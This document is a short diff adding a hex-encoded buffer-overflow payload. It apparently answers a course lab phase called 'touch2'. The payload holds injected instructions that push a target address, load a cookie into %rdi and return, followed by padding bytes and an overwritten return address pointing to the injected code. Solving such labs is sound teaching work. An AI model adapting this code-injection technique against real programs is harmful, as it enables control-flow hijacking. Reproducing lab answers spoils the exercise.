@@ -1,0 +1,5 @@
+68 ec 17 40 00 	        /* push touch2_address */
+48 c7 c7 fa 97 b9 59 	/* mov cookie_val, %rdi */
+c3                      /* ret */
+62 6C 61 20 62 6C 61 20 62 6C 61 20 62 6C 61 20 62 6C 61 20 62 6C 61 20 62 6C 61 /* bla bla .. (27 bytes) */
+78 dc 61 55  /* address of code above */
